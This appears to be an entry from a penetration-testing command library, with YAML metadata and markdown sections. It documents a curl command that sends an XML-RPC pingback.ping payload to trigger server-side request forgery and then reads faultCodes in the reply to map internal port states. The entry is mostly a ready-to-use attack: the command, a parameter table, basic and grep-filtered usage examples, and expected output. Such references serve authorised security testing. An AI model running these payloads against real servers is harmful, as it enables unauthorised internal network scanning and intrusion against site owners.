---
id: cmd-curl-xmlrpc-error
data: >-
  curl -X POST https://target.com/xmlrpc/pingback/ -H "Content-Type: text/xml"
  -d '<?xml
  version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://non.existent:80/</string></value></param><param><value><string>https://target.com/web/guest/home/</string></value></param></params></methodCall>'
tags:
  - ssrf
  - scanning
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:09.753Z'
verified: false
validated: true
submitted: true
---
# curl-xmlrpc-error-test

## Command

```bash
curl -X POST https://target.com/xmlrpc/pingback/ \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://non.existent:80/</string></value></param><param><value><string>https://target.com/web/guest/home/</string></value></param></params></methodCall>'
```

## Description

Triggers SSRF with a test URL to elicit error responses, useful for differentiating port states based on faultCodes in the XML reply.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | POST method | Yes |
| `-H "Content-Type: text/xml"` | XML header | Yes |
| `-d '...'` | Payload with test URL including port | Yes |
| `https://target.com/xmlrpc/pingback/` | Endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://example.com/xmlrpc/pingback/ -H "Content-Type: text/xml" -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://test:22/</string></value></param><param><value><string>https://example.com/</string></value></param></params></methodCall>'
```

### Advanced Usage

```bash
curl -X POST https://target.com/xmlrpc/pingback/ -H "Content-Type: text/xml" -d '...' -s | grep faultCode
```

## Expected Output

XML fault like <fault><value><struct><member><name>faultCode</name><value><int>16</int></value></member><member><name>faultString</name><value><string>Error accessing source URI</string></value></member></struct></value></fault>.

## Related

- [[Related Procedure: Test-SSRF-with-Error-Responses-for-Port-Scanning]]
